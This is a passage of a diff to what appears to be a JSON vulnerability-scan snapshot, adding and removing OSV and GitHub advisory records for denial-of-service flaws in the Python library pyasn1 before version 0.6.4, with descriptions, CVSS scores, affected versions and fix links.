+                "GHSA-8ppf-4f7h-5ppj"
+              ],
+              "details": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER, CER, and DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs, so a small crafted payload containing an OID with many arcs consumes excessive CPU per decode() call and can deny service to applications that decode untrusted ASN.1 data. The corresponding encoders have the same quadratic behavior when an application re-encodes previously decoded attacker-supplied values. This issue is fixed in version 0.6.4.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "pyasn1",
+                    "purl": "pkg:pypi/pyasn1"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.6.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.0.10a",
+                    "0.0.11a",
+                    "0.0.12a",
+                    "0.0.13",
+                    "0.0.13a",
+                    "0.0.13b",
+                    "0.0.6a",
+                    "0.0.9a",
+                    "0.1.1",
+                    "0.1.2",
+                    "0.1.3",
+                    "0.1.4",
+                    "0.1.5",
+                    "0.1.6",
+                    "0.1.7",
+                    "0.1.8",
+                    "0.1.9",
+                    "0.2.1",
+                    "0.2.2",
+                    "0.2.3",
+                    "0.3.1",
+                    "0.3.2",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "0.4.1",
+                    "0.4.2",
+                    "0.4.3",
+                    "0.4.4",
+                    "0.4.5",
+                    "0.4.6",
+                    "0.4.7",
+                    "0.4.8",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.6.0",
+                    "0.6.1",
+                    "0.6.2",
+                    "0.6.3"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyasn1/PYSEC-2026-3456.yaml"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-8ppf-4f7h-5ppj"
+                },
+                {
+                  "type": "FIX",
+                  "url": "https://github.com/pyasn1/pyasn1/commit/45bdb19eb7df4b3780fe9c912c63e99bffc39dd9"
+                }
+              ]
+            },
+            {
+              "modified": "2026-07-22T11:00:08Z",
+              "published": "2026-07-14T17:17:15Z",
+              "schema_version": "1.7.5",
+              "id": "PYSEC-2026-3457",
+              "aliases": [
+                "CVE-2026-59886",
+                "GHSA-hm4w-wwcw-mr6r"
+              ],
+              "details": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the univ.Real type converted its mantissa, base, and exponent value to a Python float using exact big-integer exponentiation. A BER, CER, or DER encoded REAL value only a few bytes long can carry a very large exponent, causing float conversion through prettyPrint(), str(), comparison, arithmetic, int(), or an explicit float() call to consume excessive CPU and memory and hang applications that decode untrusted ASN.1 data and then print, log, or compare decoded objects. This issue is fixed in version 0.6.4.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "pyasn1",
+                    "purl": "pkg:pypi/pyasn1"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.6.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.0.10a",
+                    "0.0.11a",
+                    "0.0.12a",
+                    "0.0.13",
+                    "0.0.13a",
+                    "0.0.13b",
+                    "0.0.6a",
+                    "0.0.9a",
+                    "0.1.1",
+                    "0.1.2",
+                    "0.1.3",
+                    "0.1.4",
+                    "0.1.5",
+                    "0.1.6",
+                    "0.1.7",
+                    "0.1.8",
+                    "0.1.9",
+                    "0.2.1",
+                    "0.2.2",
+                    "0.2.3",
+                    "0.3.1",
+                    "0.3.2",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "0.4.1",
+                    "0.4.2",
+                    "0.4.3",
+                    "0.4.4",
+                    "0.4.5",
+                    "0.4.6",
+                    "0.4.7",
+                    "0.4.8",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.6.0",
+                    "0.6.1",
+                    "0.6.2",
+                    "0.6.3"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyasn1/PYSEC-2026-3457.yaml"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-hm4w-wwcw-mr6r"
+                },
+                {
+                  "type": "FIX",
+                  "url": "https://github.com/pyasn1/pyasn1/commit/e60c691cb91addb8fcefa2f537e85ede6fb1e886"
+                }
+              ]
+            },
+            {
+              "modified": "2026-07-23T09:29:39Z",
+              "published": "2026-07-21T19:11:03Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-8ppf-4f7h-5ppj",
+              "aliases": [
+                "CVE-2026-59885",
+                "PYSEC-2026-3456"
+              ],
+              "related": [
+                "CGA-cgqf-4g9j-p3mr"
+              ],
+              "summary": "pyasn1: Quadratic complexity in OBJECT IDENTIFIER and RELATIVE-OID processing allows denial of service",
+              "details": "### Impact\nThe BER/CER/DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs. A small crafted payload (tens of kilobytes) containing an OID with many arcs consumes seconds of CPU per decode() call, allowing denial of service in any application that decodes untrusted ASN.1 data (certificates, LDAP, SNMP, Kerberos, etc.). The corresponding encoders have the same quadratic behavior, reachable when an application re-encodes previously decoded attacker-supplied values.\n\nThe arc-size limit introduced for CVE-2026-23490 bounds the byte length of an individual arc but not the number of arcs, so it does not mitigate this issue.\n\n### Affected components\nObjectIdentifierPayloadDecoder and RelativeOIDPayloadDecoder in pyasn1/codec/ber/decoder.py; ObjectIdentifierEncoder and RelativeOIDEncoder in pyasn1/codec/ber/encoder.py. The CER and DER codecs inherit these and are equally affected.\n\n### Patches\nFixed in pyasn1 0.6.4: arc accumulation in both decoders and encoders now runs in linear time.\n\n### Workarounds\nLimit the size of untrusted ASN.1 input before decoding.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "pyasn1",
+                    "purl": "pkg:pypi/pyasn1"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.6.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.0.10a",
+                    "0.0.11a",
+                    "0.0.12a",
+                    "0.0.13",
+                    "0.0.13a",
+                    "0.0.13b",
+                    "0.0.6a",
+                    "0.0.9a",
+                    "0.1.1",
+                    "0.1.2",
+                    "0.1.3",
+                    "0.1.4",
+                    "0.1.5",
+                    "0.1.6",
+                    "0.1.7",
+                    "0.1.8",
+                    "0.1.9",
+                    "0.2.1",
+                    "0.2.2",
+                    "0.2.3",
+                    "0.3.1",
+                    "0.3.2",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "0.4.1",
+                    "0.4.2",
+                    "0.4.3",
+                    "0.4.4",
+                    "0.4.5",
+                    "0.4.6",
+                    "0.4.7",
+                    "0.4.8",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.6.0",
+                    "0.6.1",
+                    "0.6.2",
+                    "0.6.3"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 0.6.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-8ppf-4f7h-5ppj/GHSA-8ppf-4f7h-5ppj.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-8ppf-4f7h-5ppj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59885"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyasn1/pyasn1/commit/45bdb19eb7df4b3780fe9c912c63e99bffc39dd9"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/pyasn1/pyasn1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400",
+                  "CWE-407"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-21T19:11:03Z",
+                "nvd_published_at": "2026-07-14T17:17:14Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-07-23T09:29:38Z",
+              "published": "2026-07-21T19:11:20Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-hm4w-wwcw-mr6r",
+              "aliases": [
+                "CVE-2026-59886",
+                "PYSEC-2026-3457"
+              ],
+              "related": [
+                "CGA-cpqg-2679-h8hg"
+              ],
+              "summary": "pyasn1: Uncontrolled resource consumption when converting decoded REAL values",
+              "details": "### Impact\nThe univ.Real type converted its (mantissa, base, exponent) value to a Python float using exact big-integer exponentiation. A BER/CER/DER-encoded REAL value only a few bytes long can carry a very large exponent, causing this computation to attempt to materialize an astronomically large integer.\n\nAny operation that triggers float conversion on such a decoded value \u2014 prettyPrint(), str(), comparison, arithmetic, or an explicit float() call \u2014 consumes excessive CPU and memory, hanging the process. Applications that decode untrusted ASN.1 data and then print, log, or compare the decoded objects are vulnerable to denial of service. Decoding alone does not trigger the issue.\n\n### Affected components\n- pyasn1.type.univ.Real \u2014 float conversion (__float__() and everything built on it: prettyPrint(), str(), comparisons, arithmetic, int())\n- Reachable through the pyasn1.codec.ber, cer, and der decoders, which produce Real objects from untrusted input; also via directly constructed Real values\n\nThe encoders and the native codec are not affected. Applications that never handle ASN.1 REAL values are not affected.\n\n### Patches\nFixed in pyasn1 0.6.4. Binary (base-2) values are now converted with math.ldexp(), and decimal (base-10) values with exponents beyond float range raise OverflowError without constructing huge intermediate integers. Existing behavior is preserved: out-of-range values raise OverflowError and prettyPrint() renders them as <overflow>.\n\n### Workarounds\nAvoid converting, printing, or comparing decoded Real objects from untrusted sources; inspect the raw (mantissa, base, exponent) tuple instead.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "pyasn1",
+                    "purl": "pkg:pypi/pyasn1"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.6.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.0.10a",
+                    "0.0.11a",
+                    "0.0.12a",
+                    "0.0.13",
+                    "0.0.13a",
+                    "0.0.13b",
+                    "0.0.6a",
+                    "0.0.9a",
+                    "0.1.1",
+                    "0.1.2",
+                    "0.1.3",
+                    "0.1.4",
+                    "0.1.5",
+                    "0.1.6",
+                    "0.1.7",
+                    "0.1.8",
+                    "0.1.9",
+                    "0.2.1",
+                    "0.2.2",
+                    "0.2.3",
+                    "0.3.1",
+                    "0.3.2",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "0.4.1",
+                    "0.4.2",
+                    "0.4.3",
+                    "0.4.4",
+                    "0.4.5",
+                    "0.4.6",
+                    "0.4.7",
+                    "0.4.8",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.6.0",
+                    "0.6.1",
+                    "0.6.2",
+                    "0.6.3"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 0.6.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-hm4w-wwcw-mr6r/GHSA-hm4w-wwcw-mr6r.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-hm4w-wwcw-mr6r"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59886"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyasn1/pyasn1/commit/e60c691cb91addb8fcefa2f537e85ede6fb1e886"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/pyasn1/pyasn1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-21T19:11:20Z",
+                "nvd_published_at": "2026-07-14T17:17:15Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
           "groups": [
             {
               "ids": [
@@ -3940,545 +4410,6 @@
           ],
           "licenses": [
             "BSD-2-Clause"
-          ],
-          "vulnerabilities": [
-            {
-              "affected": [
-                {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyasn1/PYSEC-2026-3455.yaml"
-                  },
-                  "ecosystem_specific": {},
-                  "package": {
-                    "ecosystem": "PyPI",
-                    "name": "pyasn1",
-                    "purl": "pkg:pypi/pyasn1"
-                  },
-                  "ranges": [
-                    {
-                      "events": [
-                        {
-                          "introduced": "0"
-                        },
-                        {
-                          "fixed": "0.6.4"
-                        }
-                      ],
-                      "type": "ECOSYSTEM"
-                    }
-                  ],
-                  "versions": [
-                    "0.0.10a",
-                    "0.0.11a",
-                    "0.0.12a",
-                    "0.0.13",
-                    "0.0.13a",
-                    "0.0.13b",
-                    "0.0.6a",
-                    "0.0.9a",
-                    "0.1.1",
-                    "0.1.2",
-                    "0.1.3",
-                    "0.1.4",
-                    "0.1.5",
-                    "0.1.6",
-                    "0.1.7",
-                    "0.1.8",
-                    "0.1.9",
-                    "0.2.1",
-                    "0.2.2",
-                    "0.2.3",
-                    "0.3.1",
-                    "0.3.2",
-                    "0.3.3",
-                    "0.3.4",
-                    "0.3.5",
-                    "0.3.6",
-                    "0.3.7",
-                    "0.4.1",
-                    "0.4.2",
-                    "0.4.3",
-                    "0.4.4",
-                    "0.4.5",
-                    "0.4.6",
-                    "0.4.7",
-                    "0.4.8",
-                    "0.5.0",
-                    "0.5.1",
-                    "0.6.0",
-                    "0.6.1",
-                    "0.6.2",
-                    "0.6.3"
-                  ]
-                }
-              ],
-              "aliases": [
-                "CVE-2026-59884",
-                "GHSA-m4p7-r5rc-7g4j"
-              ],
-              "details": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER decoder shared by the CER and DER codecs parses long-form tags by accumulating continuation octets without an upper bound on the tag ID size, allowing a crafted input to force construction of an arbitrarily large integer with CPU cost growing quadratically and to trigger unhandled ValueError exceptions in Python 3.11+ error formatting paths. Any application decoding untrusted BER, CER, or DER input is affected. This issue is fixed in version 0.6.4.",
-              "id": "PYSEC-2026-3455",
-              "modified": "2026-07-22T11:00:08.839373736Z",
-              "published": "2026-07-14T17:17:14.750Z",
-              "references": [
-                {
-                  "type": "ADVISORY",
-                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
-                },
-                {
-                  "type": "ADVISORY",
-                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-m4p7-r5rc-7g4j"
-                },
-                {
-                  "type": "FIX",
-                  "url": "https://github.com/pyasn1/pyasn1/commit/628e36ecbb5277a3f01572ce418ef54271b165a5"
-                }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-                  "type": "CVSS_V3"
-                }
-              ]
-            },
-            {
-              "affected": [
-                {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyasn1/PYSEC-2026-3456.yaml"
-                  },
-                  "ecosystem_specific": {},
-                  "package": {
-                    "ecosystem": "PyPI",
-                    "name": "pyasn1",
-                    "purl": "pkg:pypi/pyasn1"
-                  },
-                  "ranges": [
-                    {
-                      "events": [
-                        {
-                          "introduced": "0"
-                        },
-                        {
-                          "fixed": "0.6.4"
-                        }
-                      ],
-                      "type": "ECOSYSTEM"
-                    }
-                  ],
-                  "versions": [
-                    "0.0.10a",
-                    "0.0.11a",
-                    "0.0.12a",
-                    "0.0.13",
-                    "0.0.13a",
-                    "0.0.13b",
-                    "0.0.6a",
-                    "0.0.9a",
-                    "0.1.1",
-                    "0.1.2",
-                    "0.1.3",
-                    "0.1.4",
-                    "0.1.5",
-                    "0.1.6",
-                    "0.1.7",
-                    "0.1.8",
-                    "0.1.9",
-                    "0.2.1",
-                    "0.2.2",
-                    "0.2.3",
-                    "0.3.1",
-                    "0.3.2",
-                    "0.3.3",
-                    "0.3.4",
-                    "0.3.5",
-                    "0.3.6",
-                    "0.3.7",
-                    "0.4.1",
-                    "0.4.2",
-                    "0.4.3",
-                    "0.4.4",
-                    "0.4.5",
-                    "0.4.6",
-                    "0.4.7",
-                    "0.4.8",
-                    "0.5.0",
-                    "0.5.1",
-                    "0.6.0",
-                    "0.6.1",
-                    "0.6.2",
-                    "0.6.3"
-                  ]
-                }
-              ],
-              "aliases": [
-                "CVE-2026-59885",
-                "GHSA-8ppf-4f7h-5ppj"
-              ],
-              "details": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER, CER, and DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs, so a small crafted payload containing an OID with many arcs consumes excessive CPU per decode() call and can deny service to applications that decode untrusted ASN.1 data. The corresponding encoders have the same quadratic behavior when an application re-encodes previously decoded attacker-supplied values. This issue is fixed in version 0.6.4.",
-              "id": "PYSEC-2026-3456",
-              "modified": "2026-07-22T11:00:08.814095424Z",
-              "published": "2026-07-14T17:17:14.880Z",
-              "references": [
-                {
-                  "type": "ADVISORY",
-                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
-                },
-                {
-                  "type": "ADVISORY",
-                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-8ppf-4f7h-5ppj"
-                },
-                {
-                  "type": "FIX",
-                  "url": "https://github.com/pyasn1/pyasn1/commit/45bdb19eb7df4b3780fe9c912c63e99bffc39dd9"
-                }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-                  "type": "CVSS_V3"
-                }
-              ]
-            },
-            {
-              "affected": [
-                {
-                  "database_specific": {
-                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyasn1/PYSEC-2026-3457.yaml"
-                  },
-                  "ecosystem_specific": {},
-                  "package": {
-                    "ecosystem": "PyPI",
-                    "name": "pyasn1",
-                    "purl": "pkg:pypi/pyasn1"
-                  },
-                  "ranges": [
-                    {
-                      "events": [
-                        {
-                          "introduced": "0"
-                        },
-                        {
-                          "fixed": "0.6.4"
-                        }
-                      ],
-                      "type": "ECOSYSTEM"
-                    }
-                  ],
-                  "versions": [
-                    "0.0.10a",
-                    "0.0.11a",
-                    "0.0.12a",
-                    "0.0.13",
-                    "0.0.13a",
-                    "0.0.13b",
-                    "0.0.6a",
-                    "0.0.9a",
-                    "0.1.1",
-                    "0.1.2",
-                    "0.1.3",
-                    "0.1.4",
-                    "0.1.5",
-                    "0.1.6",
-                    "0.1.7",
-                    "0.1.8",
-                    "0.1.9",
-                    "0.2.1",
-                    "0.2.2",
-                    "0.2.3",
-                    "0.3.1",
-                    "0.3.2",
-                    "0.3.3",
-                    "0.3.4",
-                    "0.3.5",
-                    "0.3.6",
-                    "0.3.7",
-                    "0.4.1",
-                    "0.4.2",
-                    "0.4.3",
-                    "0.4.4",
-                    "0.4.5",
-                    "0.4.6",
-                    "0.4.7",
-                    "0.4.8",
-                    "0.5.0",
-                    "0.5.1",
-                    "0.6.0",
-                    "0.6.1",
-                    "0.6.2",
-                    "0.6.3"
-                  ]
-                }
-              ],
-              "aliases": [
-                "CVE-2026-59886",
-                "GHSA-hm4w-wwcw-mr6r"
-              ],
-              "details": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the univ.Real type converted its mantissa, base, and exponent value to a Python float using exact big-integer exponentiation. A BER, CER, or DER encoded REAL value only a few bytes long can carry a very large exponent, causing float conversion through prettyPrint(), str(), comparison, arithmetic, int(), or an explicit float() call to consume excessive CPU and memory and hang applications that decode untrusted ASN.1 data and then print, log, or compare decoded objects. This issue is fixed in version 0.6.4.",
-              "id": "PYSEC-2026-3457",
-              "modified": "2026-07-22T11:00:08.839691351Z",
-              "published": "2026-07-14T17:17:15.010Z",
-              "references": [
-                {
-                  "type": "ADVISORY",
-                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
-                },
-                {
-                  "type": "ADVISORY",
-                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-hm4w-wwcw-mr6r"
-                },
-                {
-                  "type": "FIX",
-                  "url": "https://github.com/pyasn1/pyasn1/commit/e60c691cb91addb8fcefa2f537e85ede6fb1e886"
-                }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-                  "type": "CVSS_V3"
-                }
-              ]
-            },
-            {
-              "affected": [
-                {
-                  "database_specific": {
-                    "last_known_affected_version_range": "<= 0.6.3",
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-8ppf-4f7h-5ppj/GHSA-8ppf-4f7h-5ppj.json"
-                  },
-                  "package": {
-                    "ecosystem": "PyPI",
-                    "name": "pyasn1",
-                    "purl": "pkg:pypi/pyasn1"
-                  },
-                  "ranges": [
-                    {
-                      "events": [
-                        {
-                          "introduced": "0"
-                        },
-                        {
-                          "fixed": "0.6.4"
-                        }
-                      ],
-                      "type": "ECOSYSTEM"
-                    }
-                  ],
-                  "versions": [
-                    "0.0.10a",
-                    "0.0.11a",
-                    "0.0.12a",
-                    "0.0.13",
-                    "0.0.13a",
-                    "0.0.13b",
-                    "0.0.6a",
-                    "0.0.9a",
-                    "0.1.1",
-                    "0.1.2",
-                    "0.1.3",
-                    "0.1.4",
-                    "0.1.5",
-                    "0.1.6",
-                    "0.1.7",
-                    "0.1.8",
-                    "0.1.9",
-                    "0.2.1",
-                    "0.2.2",
-                    "0.2.3",
-                    "0.3.1",
-                    "0.3.2",
-                    "0.3.3",
-                    "0.3.4",
-                    "0.3.5",
-                    "0.3.6",
-                    "0.3.7",
-                    "0.4.1",
-                    "0.4.2",
-                    "0.4.3",
-                    "0.4.4",
-                    "0.4.5",
-                    "0.4.6",
-                    "0.4.7",
-                    "0.4.8",
-                    "0.5.0",
-                    "0.5.1",
-                    "0.6.0",
-                    "0.6.1",
-                    "0.6.2",
-                    "0.6.3"
-                  ]
-                }
-              ],
-              "aliases": [
-                "CVE-2026-59885",
-                "PYSEC-2026-3456"
-              ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-400",
-                  "CWE-407"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-07-21T19:11:03Z",
-                "nvd_published_at": "2026-07-14T17:17:14Z",
-                "severity": "HIGH"
-              },
-              "details": "### Impact\nThe BER/CER/DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs. A small crafted payload (tens of kilobytes) containing an OID with many arcs consumes seconds of CPU per decode() call, allowing denial of service in any application that decodes untrusted ASN.1 data (certificates, LDAP, SNMP, Kerberos, etc.). The corresponding encoders have the same quadratic behavior, reachable when an application re-encodes previously decoded attacker-supplied values.\n\nThe arc-size limit introduced for CVE-2026-23490 bounds the byte length of an individual arc but not the number of arcs, so it does not mitigate this issue.\n\n### Affected components\nObjectIdentifierPayloadDecoder and RelativeOIDPayloadDecoder in pyasn1/codec/ber/decoder.py; ObjectIdentifierEncoder and RelativeOIDEncoder in pyasn1/codec/ber/encoder.py. The CER and DER codecs inherit these and are equally affected.\n\n### Patches\nFixed in pyasn1 0.6.4: arc accumulation in both decoders and encoders now runs in linear time.\n\n### Workarounds\nLimit the size of untrusted ASN.1 input before decoding.",
-              "id": "GHSA-8ppf-4f7h-5ppj",
-              "modified": "2026-07-22T11:11:16.942605742Z",
-              "published": "2026-07-21T19:11:03Z",
-              "references": [
-                {
-                  "type": "WEB",
-                  "url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-8ppf-4f7h-5ppj"
-                },
-                {
-                  "type": "ADVISORY",
-                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59885"
-                },
-                {
-                  "type": "WEB",
-                  "url": "https://github.com/pyasn1/pyasn1/commit/45bdb19eb7df4b3780fe9c912c63e99bffc39dd9"
-                },
-                {
-                  "type": "PACKAGE",
-                  "url": "https://github.com/pyasn1/pyasn1"
-                },
-                {
-                  "type": "WEB",
-                  "url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4"
-                }
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
-                  "type": "CVSS_V3"
-                }
-              ],
-              "summary": "pyasn1: Quadratic complexity in OBJECT IDENTIFIER and RELATIVE-OID processing allows denial of service"
-            },
-            {
-              "affected": [
-                {
-                  "database_specific": {
-                    "last_known_affected_version_range": "<= 0.6.3",
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-hm4w-wwcw-mr6r/GHSA-hm4w-wwcw-mr6r.json"
-                  },
-                  "package": {
-                    "ecosystem": "PyPI",
-                    "name": "pyasn1",
-                    "purl": "pkg:pypi/pyasn1"
-                  },
-                  "ranges": [
-                    {
-                      "events": [
-                        {
-                          "introduced": "0"
-                        },
-                        {
-                          "fixed": "0.6.4"
-                        }
-                      ],
-                      "type": "ECOSYSTEM"
-                    }
-                  ],
-                  "versions": [
-                    "0.0.10a",
-                    "0.0.11a",
-                    "0.0.12a",
-                    "0.0.13",
-                    "0.0.13a",
-                    "0.0.13b",
-                    "0.0.6a",
-                    "0.0.9a",
-                    "0.1.1",
-                    "0.1.2",
-                    "0.1.3",
-                    "0.1.4",
-                    "0.1.5",
-                    "0.1.6",
-                    "0.1.7",
-                    "0.1.8",
-                    "0.1.9",
-                    "0.2.1",
-                    "0.2.2",
-                    "0.2.3",
-                    "0.3.1",
-                    "0.3.2",
-                    "0.3.3",
-                    "0.3.4",
-                    "0.3.5",
-                    "0.3.6",
-                    "0.3.7",
-                    "0.4.1",
-                    "0.4.2",
-                    "0.4.3",
-                    "0.4.4",
-                    "0.4.5",
-                    "0.4.6",
-                    "0.4.7",
-                    "0.4.8",
-                    "0.5.0",
-                    "0.5.1",
-                    "0.6.0",
-                    "0.6.1",
-                    "0.6.2",
-                    "0.6.3"
-                  ]
-                }
-              ],
-              "aliases": [
-                "CVE-2026-59886",
-                "PYSEC-2026-3457"
-              ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-400"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-07-21T19:11:20Z",
-                "nvd_published_at": "2026-07-14T17:17:15Z",
-                "severity": "HIGH"
-              },
-              "details": "### Impact\nThe univ.Real type converted its (mantissa, base, exponent) value to a Python float using exact big-integer exponentiation. A BER/CER/DER-encoded REAL value only a few bytes long can carry a very large exponent, causing this computation to attempt to materialize an astronomically large integer.\n\nAny operation that triggers float conversion on such a decoded value \u2014 prettyPrint(), str(), comparison, arithmetic, or an explicit float() call \u2014 consumes excessive CPU and memory, hanging the process. Applications that decode untrusted ASN.1 data and then print, log, or compare the decoded objects are vulnerable to denial of service. Decoding alone does not trigger the issue.\n\n### Affected components\n- pyasn1.type.univ.Real \u2014 float conversion (__float__() and everything built on it: prettyPrint(), str(), comparisons, arithmetic, int())\n- Reachable through the pyasn1.codec.ber, cer, and der decoders, which produce Real objects from untrusted input; also via directly constructed Real values\n\nThe encoders and the native codec are not affected. Applications that never handle ASN.1 REAL values are not affected.\n\n### Patches\nFixed in pyasn1 0.6.4. Binary (base-2) values are now converted with math.ldexp(), and decimal (base-10) values with exponents beyond float range raise OverflowError without constructing huge intermediate integers. Existing behavior is preserved: out-of-range values raise OverflowError and prettyPrint() renders them as <overflow>.\n\n### Workarounds\nAvoid converting, printing, or comparing decoded Real objects from untrusted sources; inspect the raw (mantissa, base, exponent) tuple instead.",
-              "id": "GHSA-hm4w-wwcw-mr6r",
-              "modified": "2026-07-22T11:11:16.518263592Z",
-              "published": "2026-07-21T19:11:20Z",
-              "references": [
-                {
-                  "type": "WEB",
